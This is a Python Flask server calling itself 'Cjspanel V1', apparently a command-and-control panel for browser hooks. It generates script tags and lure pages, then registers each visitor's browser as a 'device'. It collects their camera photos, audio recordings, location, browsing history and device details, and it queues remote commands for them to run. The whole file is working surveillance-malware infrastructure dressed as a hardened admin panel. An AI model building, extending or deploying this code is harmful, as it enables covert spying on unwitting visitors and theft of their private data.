#!/usr/bin/env python3
"""
Cjspanel V1 - Production Ready
Security Hardened Version
"""
import os
import json
import sqlite3
import secrets
import hashlib
from functools import wraps
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for, abort
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
import threading
import time
import base64
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)

# ==================== SECURITY CONFIGURATIONS ====================

# Secret key from environment variable (REQUIRED for production)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_COOKIE_SECURE'] = True  # Only send cookies over HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Prevent JavaScript access to cookies
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)  # Session expires in 24 hours

# CORS configuration - restrict to known origins in production
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', '*').split(',')
CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)

# Rate limiting to prevent brute force attacks
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# ==================== DEFAULT CREDENTIALS ====================
# These will be stored hashed in database
DEFAULT_USERNAME = os.environ.get('ADMIN_USERNAME', 'Chetancj')
DEFAULT_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Chetancj')

# Base directories
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DEVICES_DIR = os.path.join(DATA_DIR, 'devices')

# Store active devices
active_devices = {}

# ==================== SECURITY UTILITIES ====================

def hash_password(password):
    """Hash password using werkzeug's secure method"""
    return generate_password_hash(password, method='pbkdf2:sha256:260000')

def verify_password(stored_hash, password):
    """Verify password against stored hash"""
    return check_password_hash(stored_hash, password)

def login_required(f):
    """Decorator to require login for routes"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            if request.is_json:
                return jsonify({'error': 'Authentication required'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def api_key_required(f):
    """Decorator for API endpoints that need authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check session first
        if 'logged_in' in session:
            return f(*args, **kwargs)
        
        # Check API key header
        api_key = request.headers.get('X-API-Key')
        if api_key:
            settings = get_settings()
            if api_key == settings.get('api_key'):
                return f(*args, **kwargs)
        
        return jsonify({'error': 'Authentication required'}), 401
    return decorated_function

def sanitize_input(value, max_length=1000):
    """Sanitize user input"""
    if value is None:
        return None
    value = str(value)[:max_length]
    # Remove potentially dangerous characters
    return value.replace('<', '&lt;').replace('>', '&gt;')

# ==================== DATABASE SETUP ====================

def ensure_directories():
    """Create necessary directories"""
    os.makedirs(DATA_DIR, exist_ok=True)
    os.makedirs(DEVICES_DIR, exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)

def get_db_path():
    """Get database path from environment or default"""
    return os.environ.get('DATABASE_PATH', os.path.join(BASE_DIR, 'Cjspanel.db'))

def init_db():
    """Initialize database with secure schema"""
    db_path = get_db_path()
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    # Create tables if not exist (don't drop existing data in production)
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id TEXT PRIMARY KEY, 
                  ip TEXT, 
                  user_agent TEXT, 
                  status TEXT DEFAULT 'offline',
                  last_seen TEXT,
                  created_at TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS device_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  data_type TEXT,
                  data_content TEXT,
                  file_path TEXT,
                  created_at TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS settings
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  key TEXT UNIQUE,
                  value TEXT)''')
    
    # Check if settings exist, if not initialize with hashed password
    c.execute("SELECT value FROM settings WHERE key='password_hash'")
    if not c.fetchone():
        # Generate API key for programmatic access
        api_key = secrets.token_urlsafe(32)
        
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
                  ('username', DEFAULT_USERNAME))
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
                  ('password_hash', hash_password(DEFAULT_PASSWORD)))
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
                  ('api_key', api_key))
        print(f"🔑 API Key generated: {api_key[:8]}...")
    
    conn.commit()
    conn.close()
    print("✅ Database initialized with secure schema")

ensure_directories()
init_db()

# ==================== UTILITY FUNCTIONS ====================

@app.template_filter('from_json')
def from_json_filter(value):
    try:
        return json.loads(value)
    except:
        return {"error": "Invalid JSON", "raw": value}

@app.template_filter('format_timestamp')
def format_timestamp_filter(value):
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return value

def get_settings():
    """Get current settings from database"""
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("SELECT key, value FROM settings")
    settings = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    return settings

def update_settings(username, password):
    """Update settings in database with hashed password"""
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
              ('username', sanitize_input(username, 50)))
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
              ('password_hash', hash_password(password)))
    conn.commit()
    conn.close()

def save_file_data(device_id, data_type, content, filename):
    """Save file data to device directory"""
    # Validate device_id format (UUID)
    try:
        uuid.UUID(device_id)
    except ValueError:
        raise ValueError("Invalid device ID format")
    
    device_dir = os.path.join(DEVICES_DIR, device_id)
    os.makedirs(device_dir, exist_ok=True)
    
    type_dirs = {
        'photo_front': 'photos',
        'photo_back': 'photos', 
        'audio': 'audios',
        'location': 'locations',
        'history': 'browser_data',
        'network': 'system_info',
        'battery': 'system_info',
        'device_info': 'system_info'
    }
    
    file_dir = os.path.join(device_dir, type_dirs.get(data_type, 'other_data'))
    os.makedirs(file_dir, exist_ok=True)
    
    # Sanitize filename
    safe_filename = "".join(c for c in filename if c.isalnum() or c in '._-')[:100]
    file_path = os.path.join(file_dir, safe_filename)
    
    if content.startswith('data:'):
        header, encoded = content.split(',', 1)
        file_data = base64.b64decode(encoded)
        with open(file_path, 'wb') as f:
            f.write(file_data)
    else:
        with open(file_path, 'w') as f:
            f.write(content)
    
    return file_path

def update_device_status(device_id, status="online"):
    """Update device status in database"""
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("UPDATE devices SET status=?, last_seen=? WHERE id=?", 
              (status, datetime.now().isoformat(), device_id))
    conn.commit()
    conn.close()

# ==================== AUTH ROUTES ====================

@app.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("10 per minute")  # Rate limit login attempts
def login():
    settings = get_settings()
    
    if request.method == 'POST':
        username = sanitize_input(request.form.get('username'), 50)
        password = request.form.get('password', '')
        
        stored_username = settings.get('username', DEFAULT_USERNAME)
        stored_hash = settings.get('password_hash')
        
        # Verify credentials
        if username == stored_username:
            if stored_hash and verify_password(stored_hash, password):
                session['logged_in'] = True
                session['username'] = username
                session.permanent = True
                return redirect(url_for('dashboard'))
            # Fallback for plain text password (legacy support, will be converted on next login)
            elif settings.get('password') == password:
                session['logged_in'] = True
                session['username'] = username
                session.permanent = True
                # Update to hashed password
                update_settings(username, password)
                return redirect(url_for('dashboard'))
        
        return render_template('login.html', error='Invalid credentials')
    
    return render_template('login.html')

# ==================== PROTECTED ROUTES ====================

@app.route('/dashboard')
@login_required
def dashboard():
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY created_at DESC")
    devices = c.fetchall()
    conn.close()
    
    online_devices = []
    offline_devices = []
    
    for device in devices:
        device_id = device[0]
        if device_id in active_devices and active_devices[device_id].get('online', False):
            online_devices.append(device)
        else:
            offline_devices.append(device)
    
    print(f"📊 Dashboard: {len(online_devices)} online, {len(offline_devices)} offline devices")
    return render_template('dashboard.html', 
                         online_devices=online_devices, 
                         offline_devices=offline_devices,
                         total_devices=len(devices))

@app.route('/settings', methods=['GET', 'POST'])
@login_required
def settings_page():
    settings_data = get_settings()
    
    if request.method == 'POST':
        username = sanitize_input(request.form.get('username'), 50)
        password = request.form.get('password')
        
        if username and password and len(password) >= 6:
            update_settings(username, password)
            settings_data = get_settings()
            return render_template('settings.html', 
                                 settings=settings_data, 
                                 success='Credentials updated successfully!')
        else:
            return render_template('settings.html', 
                                 settings=settings_data, 
                                 error='Username and password (min 6 chars) are required!')
    
    return render_template('settings.html', settings=settings_data)

@app.route('/gallery')
@login_required
def gallery():
    try:
        conn = sqlite3.connect(get_db_path())
        c = conn.cursor()
        
        c.execute("""
            SELECT d.id, d.ip, d.user_agent, d.status, 
                   (SELECT COUNT(*) FROM device_data WHERE device_id = d.id) as data_count
            FROM devices d
            ORDER BY d.created_at DESC
        """)
        devices = c.fetchall()
        conn.close()
        
        return render_template('gallery.html', devices=devices)
    except Exception as e:
        print(f"❌ Gallery error: {e}")
        return "Error loading gallery", 500

@app.route('/device_gallery/<device_id>')
@login_required
def device_gallery(device_id):
    # Validate device_id format
    try:
        uuid.UUID(device_id)
    except ValueError:
        abort(400, "Invalid device ID")
    
    try:
        conn = sqlite3.connect(get_db_path())
        c = conn.cursor()
        
        c.execute("SELECT * FROM device_data WHERE device_id=? ORDER BY created_at DESC", (device_id,))
        data = c.fetchall()
        
        c.execute("SELECT * FROM devices WHERE id=?", (device_id,))
        device = c.fetchone()
        conn.close()
        
        device_files = {}
        device_dir = os.path.join(DEVICES_DIR, device_id)
        if os.path.exists(device_dir):
            for root, dirs, files in os.walk(device_dir):
                category = os.path.relpath(root, device_dir)
                if category != '.':
                    device_files[category] = []
                    for file in files:
                        file_path = os.path.join(category, file)
                        full_path = os.path.join(root, file)
                        device_files[category].append({
                            'name': file,
                            'path': f"/files/{device_id}/{file_path}",
                            'size': os.path.getsize(full_path) if os.path.exists(full_path) else 0,
                            'modified': datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat() if os.path.exists(full_path) else 'Unknown'
                        })
        
        return render_template('device_gallery.html', data=data, device=device, device_files=device_files)
    except Exception as e:
        print(f"❌ Device gallery error: {e}")
        return f"Error loading device gallery", 500

# ==================== API ROUTES ====================

@app.route('/api/delete_device/<device_id>', methods=['DELETE', 'POST'])
@login_required
def delete_device(device_id):
    """Delete a specific device and all its data"""
    # Validate device_id format
    try:
        uuid.UUID(device_id)
    except ValueError:
        return jsonify({'error': 'Invalid device ID'}), 400
    
    try:
        if device_id in active_devices:
            del active_devices[device_id]
        
        conn = sqlite3.connect(get_db_path())
        c = conn.cursor()
        c.execute("DELETE FROM devices WHERE id=?", (device_id,))
        c.execute("DELETE FROM device_data WHERE device_id=?", (device_id,))
        conn.commit()
        conn.close()
        
        device_dir = os.path.join(DEVICES_DIR, device_id)
        if os.path.exists(device_dir):
            import shutil
            shutil.rmtree(device_dir)
        
        print(f"🗑️ Deleted device: {device_id}")
        return jsonify({'status': 'success', 'message': f'Device deleted'})
    except Exception as e:
        print(f"❌ Delete device error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/clear_database', methods=['POST'])
@login_required
def clear_database():
    """Clear all devices and data from the database"""
    try:
        active_devices.clear()
        
        conn = sqlite3.connect(get_db_path())
        c = conn.cursor()
        c.execute("DELETE FROM devices")
        c.execute("DELETE FROM device_data")
        conn.commit()
        conn.close()
        
        if os.path.exists(DEVICES_DIR):
            import shutil
            shutil.rmtree(DEVICES_DIR)
            os.makedirs(DEVICES_DIR, exist_ok=True)
        
        print("🗑️ Database cleared successfully")
        return jsonify({'status': 'success', 'message': 'All data cleared successfully'})
    except Exception as e:
        print(f"❌ Clear database error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stats')
@login_required
def get_stats():
    """Get dashboard statistics for AJAX refresh"""
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM devices")
    total = c.fetchone()[0]
    conn.close()
    
    online_count = sum(1 for d in active_devices.values() if d.get('online', False))
    
    return jsonify({
        'total': total,
        'online': online_count,
        'offline': total - online_count
    })

@app.route('/generate_hook')
@login_required
def generate_hook():
    hook_id = str(uuid.uuid4())[:8]
    
    # Use environment variable for production URL
    base_url = os.environ.get('BASE_URL', f"https://{request.host}")
    
    hook_data = {
        'demo_url': f"{base_url}/demo/{hook_id}",
        'hook_url': f"{base_url}/hook/{hook_id}",
        'admin_panel': f"{base_url}/dashboard",
        'script_tag': f'<script src="{base_url}/hook/{hook_id}"></script>'
    }
    
    print(f"🎣 Generated hook: {hook_id}")
    return jsonify(hook_data)

# ==================== PUBLIC HOOK ROUTES (No Auth Required) ====================

@app.route('/demo/<hook_id>')
def demo_page(hook_id):
    # Validate hook_id format (8 char alphanumeric)
    if not hook_id.isalnum() or len(hook_id) != 8:
        abort(400)
    print(f"📄 Demo page accessed: {hook_id}")
    return render_template('demo.html', hook_id=hook_id)

@app.route('/hook/<hook_id>')
@limiter.limit("100 per minute")  # Rate limit hook requests
def hook_script(hook_id):
    # Validate hook_id format
    if not hook_id.isalnum() or len(hook_id) != 8:
        abort(400)
    
    try:
        device_id = request.args.get('device_id', str(uuid.uuid4()))
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = sanitize_input(request.headers.get('User-Agent', 'Unknown'), 500)
        
        # Validate device_id format
        try:
            uuid.UUID(device_id)
        except ValueError:
            device_id = str(uuid.uuid4())
        
        print(f"🔗 Hook accessed - Device: {device_id[:8]}..., IP: {client_ip}")
        
        conn = sqlite3.connect(get_db_path())
        c = conn.cursor()
        
        c.execute("SELECT id FROM devices WHERE id=?", (device_id,))
        existing_device = c.fetchone()
        
        if not existing_device:
            c.execute("INSERT INTO devices (id, ip, user_agent, status, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                     (device_id, client_ip, user_agent, 'online', datetime.now().isoformat(), datetime.now().isoformat()))
        else:
            c.execute("UPDATE devices SET status=?, last_seen=?, ip=? WHERE id=?", 
                     ('online', datetime.now().isoformat(), client_ip, device_id))
        
        conn.commit()
        conn.close()
        
        active_devices[device_id] = {
            'online': True,
            'last_ping': datetime.now(),
            'commands': []
        }
        
        device_dir = os.path.join(DEVICES_DIR, device_id)
        os.makedirs(device_dir, exist_ok=True)
        
        base_url = os.environ.get('BASE_URL', f"https://{request.host}")
        
        return render_template('hook.js', 
                             device_id=device_id, 
                             server_url=base_url,
                             hook_id=hook_id), 200, {'Content-Type': 'application/javascript'}
    except Exception as e:
        print(f"❌ Error in hook_script: {e}")
        return "Error", 500

@app.route('/api/heartbeat', methods=['POST'])
@limiter.limit("60 per minute")
def heartbeat():
    try:
        data = request.json
        device_id = data.get('device_id')
        
        if device_id:
            # Validate device_id
            try:
                uuid.UUID(device_id)
            except ValueError:
                return jsonify({'status': 'error', 'message': 'Invalid device ID'}), 400
            
            active_devices[device_id] = {
                'online': True,
                'last_ping': datetime.now(),
                'commands': active_devices.get(device_id, {}).get('commands', [])
            }
            update_device_status(device_id, "online")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'})

@app.route('/api/submit_data', methods=['POST'])
@limiter.limit("30 per minute")
def submit_data():
    try:
        data = request.json
        device_id = data.get('device_id')
        data_type = sanitize_input(data.get('type'), 50)
        content = data.get('content', '')
        
        # Validate device_id
        try:
            uuid.UUID(device_id)
        except ValueError:
            return jsonify({'status': 'error', 'message': 'Invalid device ID'}), 400
        
        print(f"📥 Data received from {device_id[:8]}...: {data_type}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_extension = {
            'photo_front': 'jpg', 'photo_back': 'jpg',
            'audio': 'wav', 'location': 'json',
            'history': 'json', 'network': 'json',
            'battery': 'json', 'device_info': 'json'
        }.get(data_type, 'txt')
        
        filename = f"{data_type}_{timestamp}.{file_extension}"
        
        if content:
            file_path = save_file_data(device_id, data_type, content, filename)
            
            conn = sqlite3.connect(get_db_path())
            c = conn.cursor()
            c.execute("INSERT INTO device_data (device_id, data_type, data_content, file_path, created_at) VALUES (?, ?, ?, ?, ?)",
                     (device_id, data_type, content[:500], file_path, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success', 'message': f'{data_type} saved'})
    except Exception as e:
        print(f"❌ Submit data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/check_commands/<device_id>')
def check_commands(device_id):
    # Validate device_id
    try:
        uuid.UUID(device_id)
    except ValueError:
        return jsonify({'commands': [], 'error': 'Invalid device ID'}), 400
    
    if device_id in active_devices:
        commands = active_devices[device_id].get('commands', [])
        active_devices[device_id]['commands'] = []
        active_devices[device_id]['last_ping'] = datetime.now()
        return jsonify({'commands': commands})
    return jsonify({'commands': []})

@app.route('/api/execute_command', methods=['POST'])
@login_required
def execute_command():
    try:
        data = request.json
        device_id = data.get('device_id')
        command = sanitize_input(data.get('command'), 100)
        
        # Validate device_id
        try:
            uuid.UUID(device_id)
        except ValueError:
            return jsonify({'status': 'error', 'message': 'Invalid device ID'}), 400
        
        if device_id in active_devices:
            active_devices[device_id]['commands'].append(command)
            print(f"📤 Command queued for {device_id[:8]}...: {command}")
            return jsonify({'status': 'success', 'message': f'Command {command} queued'})
        else:
            return jsonify({'status': 'error', 'message': 'Device not active'})
    except Exception as e:
        print(f"❌ Execute command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/files/<device_id>/<path:filename>')
@login_required
def serve_file(device_id, filename):
    # Validate device_id
    try:
        uuid.UUID(device_id)
    except ValueError:
        abort(400)
    
    # Prevent path traversal attacks
    safe_path = os.path.normpath(filename)
    if '..' in safe_path:
        abort(400)
    
    file_path = os.path.join(DEVICES_DIR, device_id, safe_path)
    
    if os.path.exists(file_path) and os.path.isfile(file_path):
        return send_file(file_path)
    
    abort(404)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ==================== BACKGROUND TASKS ====================

def cleanup_old_devices():
    """Mark devices as offline if no heartbeat for 60 seconds"""
    while True:
        time.sleep(30)
        current_time = datetime.now()
        for device_id in list(active_devices.keys()):
            last_ping = active_devices[device_id].get('last_ping')
            if last_ping and (current_time - last_ping).seconds > 60:
                active_devices[device_id]['online'] = False
                update_device_status(device_id, "offline")
                print(f"💤 Device marked offline: {device_id[:8]}...")

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_devices, daemon=True)
cleanup_thread.start()

# ==================== PRODUCTION ENTRY POINT ====================

if __name__ == '__main__':
    print("🦁 Cjspanel V1 Starting...")
    print(f"📁 Data Storage: {DEVICES_DIR}")
    
    # Get settings for display
    settings = get_settings()
    print(f"👤 Admin Username: {settings.get('username', DEFAULT_USERNAME)}")
    print(f"🔑 API Key: {settings.get('api_key', 'Not set')[:8]}...")
    
    # Production mode check
    if os.environ.get('PRODUCTION'):
        print("🚀 Running in PRODUCTION mode")
    else:
        print("⚠️ Running in DEVELOPMENT mode")
        print("   Set PRODUCTION=true for production deployment")
    
    # Use Gunicorn in production, Flask dev server in development
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=not os.environ.get('PRODUCTION'))
